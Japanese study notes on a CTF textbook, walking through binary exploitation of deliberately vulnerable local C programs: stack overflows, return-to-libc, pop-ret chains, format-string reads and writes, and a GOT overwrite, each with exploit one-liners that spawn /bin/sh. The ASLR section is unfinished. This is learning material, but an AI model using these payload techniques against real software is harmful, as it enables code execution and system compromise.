---
date: 2019-03-15
description: 'はりねずみめも'
category: 
 - memo
 - ctf
---

# ハリネズミ本 pwnのめも
# 実行環境
OSはUbuntu-18.04 LTSを使用しています。
```bash
$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.2 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
```
# 使用するツール
## GDB(peda)
GDBはCLIベースのデバッガです。
GDBにより, 実行ファイルがオーバーフローを起こした時に, 実行ファイルが停止した位置やその時の変数の値などを知ることができます。
また, pedaという拡張スクリプトを追加することで, 
EBXやEIPなどの情報や関数のアドレスを取得することができます。
非常に便利なので, インストールすることをおすすめします。

## objdump
objdumpはCUIベースの逆アセンブラです。
実行ファイルを解析して, アセンブリコードを出力してくれます。

さて, 前置きはこのくらいにして実際に問題を見ていきましょう。

# stack base buffer overflow
## ローカル変数の破壊
```cpp
// bof1.c
#include <stdio.h>

int main(int argc, char *argv[]){
  int zero = 0;
  char buffer[10];
  
  fgets(buffer, 64, stdin);
  printf("zero = %d\n", zero);
  return 0;
}
```

上のコードを32bit向け, SSP(stack smash protection)無効でコンパイルする.
この後, `AAAAAAAAAAAAAAAAAAAA`のような文字列を与えることでbuffer overflowを意図的に引き起こす。

```bash
$ gcc -m32 -fno-stack-protector ./bof1 ./bof1.c
$ ./bof1
buffer address  = ffffd062
zero address    = ffffd06c
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zero = 1094795585
Segmentation fault (core dumped)
```

ここで, buffer addressが`ffffd062`で, zero addressが`ffffd06c`なのは, 
main関数の中で順番に変数がstackに積まれて行くから(`ffffd062` + `10` = `ffffd06c`)。


実行結果が, `1094795585`となっているのは, `AAAA`=`0x41414141` = `1094795585`だから。

これを用いて, 任意の値を`zero`に代入してみる。

## bofを活用した, 任意の数字の書き換え

```cpp
#include <stdio.h>

int main(int argc, char *argv[]){
  int zero = 0;
  char buffer[10];

  printf("buffer address\t= %x\n", (int)buffer);
  printf("zero address\t= %x\n", (int)&zero);
  
  fgets(buffer, 64, stdin);
  printf("zero = %d\n", zero);
  if (zero == 0x12345678){
    printf("congrats!\n");
  }
  return 0;
}
```

これも, 先ほどと同様に, SSP無効でコンパイル。
この後, bufferの10バイト文を適当な文字で埋めてから, 0x12345678で埋める。

```bash
$ gcc -m32 -fno-stack-protector -o ./bof2 ./bof2.c
$ echo -e 'AAAAAAAAAA\x78\x56\x34\x12' | ./bof2
buffer address                         = ffffd062
zero address                           = ffffd06c
zero = 12345678
congrats!
Segmentation fault (core dumped)
```

はい, おk。
ここで, リトルエンディアン形式であることに注意。

`$ echo -e 'AAAAAAAAAA\x78\x56\x34\x12' | ./bof2`
について, `-e`オプションは`\x`表記を認めるというオプション。
リトルエンディアン形式なので, `\x78\x56\x34\x12`という表記になっている。

# bofを活用した, リターンアドレスの書き換え

```c
#include <stdio.h>
#include <string.h>

char buffer[32];

int main(int argc, char *argv[]){
  char local[32];

  printf("buffer address\t= %x\n", (int)buffer);
  printf("local address\t= %x\n", (int)local);

  printf("buffer: 0x%x\n", &buffer);
  fgets(local, 128, stdin);
  strcpy(buffer, local);
  return 0;
}
```

このままだと, EIPを奪取できない(コンパイラが防いでいるらしい)
[詳しくはこの記事で](https://hiziriai.hatenablog.com/entry/2017/05/17/234505)

## pythonでの\xの書き込み
```bash
$ python -c 'import sys; sys.stdout.buffer.write(b"A" * 16 +  b"\xce\xfa\xde\xc0")'
```
のように書くと, 
```bash
$ echo -e 'AAAAAAAAAAAAAAAA\xce\xfa\xde\xc0'
```
と同じ意味になる。

main 630 56555630?
printf 410 56555554?


[神記事](http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/)

system: 0xf7 e1 62 00
引数

```pg
#include <stdio.h>
#include <string.h>

char buffer[32];

void func(){
    char local[32];
  fgets(local, 128, stdin);
  strcpy(buffer, local);
}

int main(){
  printf("buffer: 0x%x\n", &buffer);
  func();
}

```

```
$ (echo -e 'r\n/bin/sh\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x62\xe1\xf7\xf1\x84\x04\x08\x60\xa0\x04\x08';cat) | gdb -q ./ret2libc 
```

## return to PLT
### 仕組み
printf@pltを呼び出す。
printfを引数込みで呼び出す。

ret命令の挙動は, (1)現在のeipをpopして(2)そのeipのアドレスにjumpするというもの。

call命令は, (1)スタックにリターンアドレスを積んでから(引数も積む)(2)jumpを行うというもの。

したがって, ret命令でcall命令を再現するには, (1)スタックにリターンアドレスを積んでおけばおk(引数も積む)。

### 攻撃コード
|内容|アドレス|補足|
|:-:|:-:|:-:|
|下位アドレス|0x00000000|...|
|...|...|...|
|関数のアドレス=リターンアドレス|0x08048340|printf@plt|
|printf呼び出し後のリターンアドレス|BBBB|ダミー|
|printfの引数(buffer)|0x0804a040|bufferの中身を表示したいので|
|上位アドレス|0xffffffff| |

gdbでpattern_createおよびpattoをかけて, EIPに設定されるのが44文字目以降であることを確認。

以上の順にEIPを埋めていけば良いため, 攻撃コードの概要は以下のようになる。
`A*44文字 + \x40\x83\x04\x08 + BBBB + \x40\xa0\x04\x08`

したがって, 攻撃コードは以下の通り。

```bash
$ python -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\x40\x83\x04\x08" + b"BBBB" + b"\x40\xa0\x04\x08")' | ./plt
```

と思いきや, 実行がうまくいきません。

調べてみると, リターンアドレスがダミーだとprintf関数が正しく実行されないようです(printf関数のret時にreturnアドレスが正しくないとSegmentationFaultになるらしい)
http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/


## Return to libc
### 仕組み
return to PLTではprintf関数を呼び出しましたが, 次はsystem関数を実行してみましょう。

system関数の実行では, /bin/sh(bash)を実行することとします。なぜなら, shellを奪えればその後はコマンドを叩いて大抵のことはできるようになるからです。

### 攻撃方法の検討
まず, system関数の場所を確認します。
main関数にbreakpointを立ててrunし, p systemで確認できます。

すると, 以下のように表示されるのでsystem関数は`0xf7e16200`にあることがわかります。
```
$1 = {<text variable, no debug info>} 0xf7e16200 <system>
```

さらに, system関数は第一引数に文字列を指定する必要があるため, とりあえずbuffer変数のアドレス(0x0804a060)を指定します。

すると, 以下のようなスタックの状況を作れれば攻撃が成功しそうです。

|内容|アドレス|補足|
|:-:|:-:|:-:|
|下位のアドレス|0x00000000| |
|...|...|...|
|関数アドレス=リターンアドレス|0xf7e16200|今回はsystem関数の場所|
|関数呼び出し後のリターンアドレス|BBBB|ダミー(あとでprintfと同じようにmain関数の番地にするかも)|
|引数1|0x0804a060|buffer変数の番地|
|...|...|...|
|上位アドレス|0xffffffff|...|

したがって、攻撃文字列は以下のようになります。
`/bin/sh(7文字) + \x00(1文字) + A*(44-7-2＝36文字) + \x00\x62\xe1\xf7 + BBBB + \x60\xa0\x04\x08` 


echoでかくと, 以下のようになる。
```
(echo -e '/bin/sh\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x62\xe1\xf7\x39\x85\x04\x08\x60\xa0\x04\x08'; cat) | ./bof
```

pythonでかくと, 以下のようになる(echoの時は挿入されている\n(改行コード)がないため, \nを挿入している)。
```
(python -c 'import sys; sys.stdout.buffer.write(b"/bin/sh" + b"\x00" + b"A"*36 + b"\x00\x62\xe1\xf7" + b"\x39\x85\x04\x08" + b"\x60\xa0\x04\x08\n")'; cat;) | ./bof
```

## popret gadget
### 概要
先程までの例では, main関数のリターンアドレスとしてmain関数のアドレスを利用していた。
しかし, このリターンアドレスに他の関数のリターンアドレスを埋め込んでおけば2つめの関数を呼び出すことが可能になる。

しかし、以下のように、単純に関数を設定するだけだとスタックの中身が散乱してしまう。

|SP|内容|補足|
|:-:|:-:|:-:|
||下位のアドレス|0x00000000|
||関数1のアドレス||
||関数1のリターンアドレス|関数2のアドレスを入れる|
||関数1の引数1|関数2のリターンアドレスを入れる|
||関数1の引数2|関数2の引数1を入れる|
||関数1の引数3|関数2の引数2を入れる|
||||

そこで, popret gadgetの考え方を使う。
実行ファイルの中にpopを数回おこなった後にretするという処理(gadget)が多く現れる。これに倣い, 関数を呼び出すために使用した引数分popしてからretすればスタックポインタの位置をずらすことができそう。

|SP|内容|補足|
|:-:|:-:|:-:|
||下位のアドレス|0x00000000|
||関数1のアドレス||
||関数1のリターンアドレス|pop pop pop ret (pop3ret)|
|pop↓|関数1の引数1||
|pop↓|関数1の引数2||
|pop↓|関数1の引数3||
|ret→|関数2のアドレス||
||関数2のリターンアドレス||
||関数2の引数1||
||関数2の引数2||
||関数2の引数3||

これを活用して, プログラムを以上終了させるためにexitを呼び出してみる。

|SP|内容|address|補足|
|:-:|:-:|:-:|:-:|
||下位のアドレス|0x00000000||
||systemのアドレス|0xf7e16200||
||systemのリターンアドレス|0x080485cb|pop ret(popret)|
|pop↓|systemの引数1|0x0804a060|buffer|
|ret→|exitのアドレス|0xf7e093d0|exit|
||exitのリターンアドレス|0x08048539|main|
||exitの引数1|0|return 0|

## ROP(Return Oriented Programing)
???

# 書式文字列攻撃
`%p`は対応するスタックの値をvoid*型として16進数で表示する。
```bash
$ python -c "print('AAAA' + '%p.'*20)" | ./fsb 
AAAA0x80.0xf7fb15c0.0x80484e5.0xf7fdf409.0xf63d4e2e.0xf7ffdaf8.0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.
secret=0x12345678
e
```

これにより, AAAAが7番目の`%p`で読み込まれていることがわかるので, スタックの7番目の値を参照すれば良いことがわかる。


## 任意のアドレスからの読み込み
`%n$s`でn番目の値をchar*型で出力する。

そのため, 入力としてsecretのアドレスをあたえ, 7番目の値を参照すればおk。

~なぜか6番目で正しく実行できているので, 0-indexedなのかも?~~
7番目でした。

```
$ echo -e '\x24\xa0\x04\x08%7$s' | ./fsb |  hexdump -C
00000000  24 a0 04 08 78 56 34 12  0a 73 65 63 72 65 74 3d  |$...xV4..secret=|
00000010  30 78 31 32 33 34 35 36  37 38 0a                 |0x12345678.|
0000001b
```

ここで, 00000005から\x78\x56\x34\x12が続いているため, その正当性が確認できる。

## 自由な書き込み
secret = 0x0804a024

`%n$n`で自由に書き込みができる。

```bash
$ echo -e '\x24\xa0\x04\x08%7$s' | ./fsb 
$�xV4
secret=0x12345678
$ echo -e '\x24\xa0\x04\x08%7$n' | ./fsb 
$�
secret=0x4
```

## GOT Overwrite
### What's GOT?
GOTとは, ライブラリの関数アドレスを保存しておく領域のこと。
GOT領域を書き換えることで, eipを変更したことと同じことになる。

### 攻撃手法の策定
デコンパイルをすると, fgets→printf→fgets→strlen→printfという流れで関数が呼び出されていることがわかる。

したがって, 最初のfgetsで, 次にくるprintfでstrlenをsystem関数に書き換える攻撃コードを流し込み, 2度目のfgets関数でstrにsystem関数の引数を設定してstrlen(str)でシェルを起動する。

GOT領域は以下のコマンドで確認できる。

```bash
$ readelf -r got

Relocation section '.rel.dyn' at offset 0x318 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff8  00000406 R_386_GLOB_DAT    00000000   __gmon_start__
08049ffc  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x328 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0
0804a014  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a018  00000507 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
```

これより, strlen関数が`0x0804a018`に書き込まれることがわかる。

次に, system関数のアドレスを確認する。
gdbによって確認すると, `0xf7e16200`であることがわかる。

```bash
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e16200 <system>
```

以上の情報を用いて, strlen関数をsystem関数で上書きする。
アドレスが8バイトなので, `%hn`を用いて2回に分けて攻撃を行う。
`0x0804a018~0x0804a019`に`0x6200`,
`0x0804a01a~0x0804a01b`に`0xf7e1`を書き込む。

この文字列を入れる番地を知るために, 書式文字列攻撃を行う。

```bash
$ echo -e 'AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p' | ./got 
AAAA,0x80,0xf7fb15c0,0x8048520,(nil),0xf7fdff9b,0x804822c,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70
44
```

以上より, 7番目に引数が格納されることがわかった。

## 攻撃手法のまとめ
したがって, 攻撃文字列は以下な形式になる。

|書式文字列|補足|出力バイト数|積算出力バイト数|
|:-:|:-:|:-:|:-:|
|0x0804a018|GOT領域のstrlen(1)|4|4|
|0x0804a01a|GOT領域のstrlen(2)|4|8|
|%25080x|25088-8=25080|25080|25088(=0x6200)|
|%7$hn|strlenの前半4バイトを埋める|0|25088|
|%38369x|63457-25088=38369|38369|63457(=0xf7e1)|
|%8$hn|strlenの後半4バイトを埋める|0|63457|
|\n|2回目にくるfgets関数のために改行を入れておく|-|-|
|/bin/sh; cat|shellを立ち上げる|-|-|

したがって, 攻撃コードは以下のようになる。

#### echo ver.
```bash
e$ (echo -e '\x18\xa0\x04\x08\x1a\xa0\x04\x08%25080x%7$hn%38369x%8$hn\n/bin/sh'; cat) | ./got 
```

#### python ver.
**/bin/shの後に\x00を入れることで, 文字列の分割を行なっている。**
```bash
$ (python -c 'import sys;sys.stdout.buffer.write(b"\x18\xa0\x04\x08\x1a\xa0\x04\x08%25080x%7$hn%38369x%8$hn\n/bin/sh\x00\n")'; cat;) | ./got
```
## ASLRの回避
ブルートフォースで回避する。

以下のコマンドでASLRを有効にする。
```bash
$ sudo sysctl -w kernel.randomize_va_space=2
```

`ldd`コマンドを使用することで, 共有ライブラリのメモリアドレスを確認する。
すると, randomizeされていることが確認できる。
```bash
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ sudo sysctl -w kernel.randomize_va_space=2
[sudo] password for task4233: 
kernel.randomize_va_space = 2
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 (0xf7f0e000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d10000)
  /lib/ld-linux.so.2 (0xf7f10000)
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 (0xf7f24000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d26000)
  /lib/ld-linux.so.2 (0xf7f26000)
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 (0xf7f74000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d76000)
  /lib/ld-linux.so.2 (0xf7f76000)
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 (0xf7efa000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7cfc000)
  /lib/ld-linux.so.2 (0xf7efc000)
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 (0xf7f2e000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d30000)
  /lib/ld-linux.so.2 (0xf7f30000)
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 (0xf7f88000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d8a000)
  /lib/ld-linux.so.2 (0xf7f8a000)
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 (0xf7fc7000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dc9000)
  /lib/ld-linux.so.2 (0xf7fc9000)
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 (0xf7fbc000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dbe000)
  /lib/ld-linux.so.2 (0xf7fbe000)
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 (0xf7ee1000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7ce3000)
  /lib/ld-linux.so.2 (0xf7ee3000)
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 (0xf7f1b000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d1d000)
  /lib/ld-linux.so.2 (0xf7f1d000)
```

ここで, libc.so.6に存在するsystem関数の相対番地を確認しておく。

```bash
$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep system
0003d200 T __libc_system
00129640 T svcerr_systemerr
0003d200 W system
```

すると,　`0x0003d200`に格納されていることがわかる。

```bash
$ strings -tx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 17e0cf /bin/sh
```

同様にして, /bin/shも調べると`0x0017e0cf`に格納されていることがわかる。

これらを元に, libc.so.6の番地を`0xf7ce1000`と仮定して,
system関数を`0xf7d1e200`,
bin/shを`0xf7e8b0cf`と仮定する。

pattern_createとpattoを用いて, OFが起きている部分を確認すると, offsetは**51**だった。


これらの情報を元に, 攻撃コードを組み立てる。

工事中...

# References
 - 磯井利宜・他 (2015)『セキュリティコンテストチャレンジブック-CTFで学ぼう!情報を守るための戦い方』マイナビ出版
 - [たのしいPwn入門](https://gist.github.com/matsubara0507/72dc50c89200a09f7c61)